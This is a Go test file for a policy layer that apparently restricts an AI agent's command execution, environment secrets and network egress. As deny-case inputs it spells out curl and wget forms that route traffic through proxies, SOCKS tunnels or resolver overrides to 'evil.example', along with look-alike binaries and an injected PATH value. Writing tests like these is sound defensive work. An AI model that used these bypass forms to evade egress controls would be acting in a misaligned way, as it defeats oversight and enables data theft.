package app

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/lunemec/promptlock/internal/config"
)

func TestValidateExecuteCommandRequiresExactExecutableIdentity(t *testing.T) {
	policy := DefaultControlPlanePolicy{
		Exec: config.ExecutionPolicy{
			ExactMatchExecutables: []string{"go", "git", "make"},
			DenylistSubstrings:    []string{"&&"},
		},
	}

	for _, cmd := range [][]string{
		{"go", "version"},
		{"/usr/local/bin/go", "version"},
		{"/usr/bin/git", "status"},
		{"make", "test"},
	} {
		if err := policy.ValidateExecuteCommand(cmd); err != nil {
			t.Fatalf("expected command %q to be allowed: %v", strings.Join(cmd, " "), err)
		}
	}

	for _, cmd := range [][]string{
		{"goevil", "version"},
		{"git-backdoor", "status"},
		{"/tmp/goevil", "version"},
	} {
		if err := policy.ValidateExecuteCommand(cmd); err == nil {
			t.Fatalf("expected command %q to be rejected", strings.Join(cmd, " "))
		}
	}
}

func TestResolveExecuteCommandRejectsPathOutsideControlledSearchPaths(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("shell-script executable helper is unix-specific")
	}

	trustedDir := t.TempDir()
	untrustedDir := t.TempDir()
	writeTestExecutable(t, filepath.Join(untrustedDir, "go"), "echo untrusted")

	policy := DefaultControlPlanePolicy{
		Exec: config.ExecutionPolicy{
			ExactMatchExecutables: []string{"go"},
			CommandSearchPaths:    []string{trustedDir},
		},
	}

	if _, err := policy.ResolveExecuteCommand([]string{filepath.Join(untrustedDir, "go"), "version"}); err == nil {
		t.Fatalf("expected path outside controlled search path to be rejected")
	}
}

func TestBuildExecutionEnvironmentStripsAmbientSecrets(t *testing.T) {
	env := BuildExecutionEnvironment([]string{
		"PATH=/usr/local/bin:/usr/bin",
		"HOME=/tmp/promptlock-home",
		"TMPDIR=/tmp/promptlock-tmp",
		"AWS_SECRET_ACCESS_KEY=ambient-secret",
		"GIT_ASKPASS=/tmp/askpass",
		"LANG=en_US.UTF-8",
	}, map[string]string{
		"github_token": "leased-github-token",
		"npm_token":    "leased-npm-token",
	})

	assertEnvContains(t, env, "PATH=/usr/local/bin:/usr/bin")
	assertEnvContains(t, env, "HOME=/tmp/promptlock-home")
	assertEnvContains(t, env, "TMPDIR=/tmp/promptlock-tmp")
	assertEnvContains(t, env, "GITHUB_TOKEN=leased-github-token")
	assertEnvContains(t, env, "NPM_TOKEN=leased-npm-token")
	assertEnvOmitsPrefix(t, env, "AWS_SECRET_ACCESS_KEY=")
	assertEnvOmitsPrefix(t, env, "GIT_ASKPASS=")
	assertEnvOmitsPrefix(t, env, "LANG=")
}

func TestBuildExecutionEnvironmentRejectsUnsafeSecretNames(t *testing.T) {
	env := BuildExecutionEnvironment([]string{
		"PATH=/usr/local/bin:/usr/bin",
		"HOME=/tmp/promptlock-home",
	}, map[string]string{
		"github_token":   "leased-github-token",
		"PATH=/tmp/evil": "should-not-appear",
		"bad-name":       "should-not-appear",
	})

	assertEnvContains(t, env, "GITHUB_TOKEN=leased-github-token")
	assertEnvOmitsPrefix(t, env, "PATH=/tmp/evil=")
	assertEnvOmitsPrefix(t, env, "BAD-NAME=")
}

func TestValidateNetworkEgressRejectsDirectClientWithoutInspectableDestination(t *testing.T) {
	policy := DefaultControlPlanePolicy{
		Network: config.NetworkEgressPolicy{
			Enabled:            true,
			RequireIntentMatch: true,
			IntentAllowDomains: map[string][]string{"run_tests": {"api.github.com"}},
		},
	}

	err := policy.ValidateNetworkEgress([]string{"curl", "--config", "./agent-controlled.cfg"}, "run_tests")
	if err == nil {
		t.Fatalf("expected direct network client without inspectable destination to be rejected")
	}
	if !strings.Contains(err.Error(), "inspectable destination") {
		t.Fatalf("expected inspectable-destination deny detail, got %v", err)
	}
}

func TestValidateNetworkEgressRejectsDirectClientDecoyDomainFlags(t *testing.T) {
	policy := DefaultControlPlanePolicy{
		Network: config.NetworkEgressPolicy{
			Enabled:            true,
			RequireIntentMatch: true,
			IntentAllowDomains: map[string][]string{"run_tests": {"api.github.com"}},
		},
	}

	for _, cmd := range [][]string{
		{"curl", "--config", "./agent.cfg", "-u", "api.github.com:token"},
		{"curl", "--config", "./agent.cfg", "--proxy", "api.github.com:443"},
		{"wget", "--config", "./agent.cfg", "--output-document", "api.github.com"},
	} {
		err := policy.ValidateNetworkEgress(cmd, "run_tests")
		if err == nil {
			t.Fatalf("expected decoy destination form %q to be rejected", strings.Join(cmd, " "))
		}
		if !strings.Contains(err.Error(), "inspectable destination") {
			t.Fatalf("expected inspectable-destination deny detail for %q, got %v", strings.Join(cmd, " "), err)
		}
	}
}

func TestValidateNetworkEgressRejectsDecoyDomainLikeValuesOnNonDestinationArgs(t *testing.T) {
	policy := DefaultControlPlanePolicy{
		Network: config.NetworkEgressPolicy{
			Enabled:            true,
			RequireIntentMatch: true,
			IntentAllowDomains: map[string][]string{"run_tests": {"api.github.com"}},
		},
	}

	for _, cmd := range [][]string{
		{"curl", "--config", "./agent-controlled.cfg", "-u", "api.github.com:token"},
		{"curl", "--config", "./agent-controlled.cfg", "--proxy", "api.github.com:443"},
		{"wget", "--config", "./agent-controlled.cfg", "--output-document", "api.github.com"},
	} {
		err := policy.ValidateNetworkEgress(cmd, "run_tests")
		if err == nil {
			t.Fatalf("expected decoy destination args to be rejected for %q", strings.Join(cmd, " "))
		}
		if !strings.Contains(err.Error(), "inspectable destination") {
			t.Fatalf("expected inspectable-destination deny for %q, got %v", strings.Join(cmd, " "), err)
		}
	}
}

func TestValidateNetworkEgressRejectsOpaqueOrDestinationOverrideArgsEvenWithInspectableURL(t *testing.T) {
	policy := DefaultControlPlanePolicy{
		Network: config.NetworkEgressPolicy{
			Enabled:            true,
			RequireIntentMatch: true,
			IntentAllowDomains: map[string][]string{"run_tests": {"api.github.com"}},
		},
	}

	for _, cmd := range [][]string{
		{"curl", "https://api.github.com/repos", "--config", "./agent-controlled.cfg"},
		{"curl", "https://api.github.com/repos", "--proxy", "http://evil.example:8080"},
		{"curl", "https://api.github.com/repos", "--proxy1.0", "http://evil.example:8080"},
		{"curl", "https://api.github.com/repos", "--preproxy", "http://evil.example:8080"},
		{"curl", "https://api.github.com/repos", "--connect-to", "api.github.com:443:evil.example:443"},
		{"curl", "https://api.github.com/repos", "--resolve", "api.github.com:443:10.0.0.1"},
		{"curl", "https://api.github.com/repos", "--socks4", "evil.example:1080"},
		{"curl", "https://api.github.com/repos", "--socks4a", "evil.example:1080"},
		{"curl", "https://api.github.com/repos", "--socks5", "evil.example:1080"},
		{"curl", "https://api.github.com/repos", "--socks5-hostname", "evil.example:1080"},
		{"curl", "https://api.github.com/repos", "--future-route-override", "evil.example"},
		{"wget", "https://api.github.com/repos", "--config", "./agent-controlled.cfg"},
		{"wget", "https://api.github.com/repos", "--input-file", "./urls.txt"},
		{"wget", "https://api.github.com/repos", "--execute", "use_proxy=on"},
	} {
		err := policy.ValidateNetworkEgress(cmd, "run_tests")
		if err == nil {
			t.Fatalf("expected opaque/destination-override args to be rejected for %q", strings.Join(cmd, " "))
		}
		if !strings.Contains(err.Error(), "opaque or destination-override") {
			t.Fatalf("expected opaque/destination-override deny for %q, got %v", strings.Join(cmd, " "), err)
		}
	}
}

func TestRedactOutputScrubsBearerAndEnvTokenShapes(t *testing.T) {
	bearerSecret := "super-secret-" + "bearer-token"
	githubToken := "gh" + "p_" + "abcdef1234567890"
	openAIToken := "sk" + "-live-" + "abcdef1234567890"
	input := strings.Join([]string{
		"Authorization: Bearer " + bearerSecret,
		"GITHUB_TOKEN=" + githubToken,
		"OPENAI_API_KEY=" + openAIToken,
	}, "\n")

	redacted := redactOutput(input)
	for _, secret := range []string{
		bearerSecret,
		githubToken,
		openAIToken,
	} {
		if strings.Contains(redacted, secret) {
			t.Fatalf("expected output to redact %q, got %q", secret, redacted)
		}
	}
	if !strings.Contains(redacted, "Authorization: Bearer [REDACTED_BEARER_TOKEN]") {
		t.Fatalf("expected bearer token marker, got %q", redacted)
	}
	if !strings.Contains(redacted, "GITHUB_TOKEN=[REDACTED_ENV_VALUE]") {
		t.Fatalf("expected env token marker, got %q", redacted)
	}
	if !strings.Contains(redacted, "OPENAI_API_KEY=[REDACTED_ENV_VALUE]") {
		t.Fatalf("expected api key marker, got %q", redacted)
	}
}

func assertEnvContains(t *testing.T, env []string, want string) {
	t.Helper()
	for _, entry := range env {
		if entry == want {
			return
		}
	}
	t.Fatalf("expected env %q in %#v", want, env)
}

func assertEnvOmitsPrefix(t *testing.T, env []string, prefix string) {
	t.Helper()
	for _, entry := range env {
		if strings.HasPrefix(entry, prefix) {
			t.Fatalf("did not expect env prefix %q in %#v", prefix, env)
		}
	}
}

func writeTestExecutable(t *testing.T, path string, body string) {
	t.Helper()
	script := "#!/bin/sh\nset -eu\n" + body + "\n"
	if err := os.WriteFile(path, []byte(script), 0o700); err != nil {
		t.Fatalf("write executable: %v", err)
	}
}
